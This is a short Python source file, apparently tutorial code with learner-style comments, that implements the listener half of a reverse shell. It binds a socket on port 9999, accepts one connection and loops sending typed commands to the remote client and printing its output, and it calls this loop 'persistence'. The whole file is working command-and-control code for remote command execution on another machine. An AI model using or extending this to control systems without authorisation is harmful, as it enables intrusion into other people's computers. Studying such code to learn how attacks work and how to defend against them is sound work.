import socket
import sys

#create Socket
def create_socket():
    try:
        global host
        global port
        global s #socket
        host= ""
        port=9999 #uncommon port
        s= socket.socket() #creates a socket
    except socket.error as msg:
        print("Socket creation error:" + str(msg))

#binding the host to the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print ("Binding the port" + str(port))
        s.bind((host,port)) #it's a tuple
        s.listen(5) #the number of connection that it can operate before throwing an error
    except socket.error as msg: #recursion
        print("Socket Binding Error"+ str(msg) + "\n"+ "Retrying!")
        bind_socket()

#accepting a connection/establishing a connection (the socket must be listening)
def socket_accept():
    #address = list of the ipv4 address
    #conn=connection to access the conversation
    #unless a connection is being established, the s.accept() will not execute the next line of code
    conn, address= s.accept()
    print("Connection has been established!" + " IP:" + address[0]+ "| Port: "+ str(address)) #the first element of the list, is a string, so no conversion needed
    send_commands(conn)
    conn.close()

#sends commands to client (obviously)
def send_commands(conn):
    #while infinite loop, so that if you want to send more than 1 command without closing the connection
    #the concept is called persistence
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit() #exiting the command line
        if len(str.encode(cmd)) > 0: #we know that the user has typed something in
            conn.send(str.encode(cmd))
            client_response=str(conn.recv(1024), "utf-8") #converting it from a byte to string
            print(client_response, end="") # end="" is basically the python version of "endl"

#create a main function
def main():
    create_socket()
    bind_socket()
    socket_accept()

main()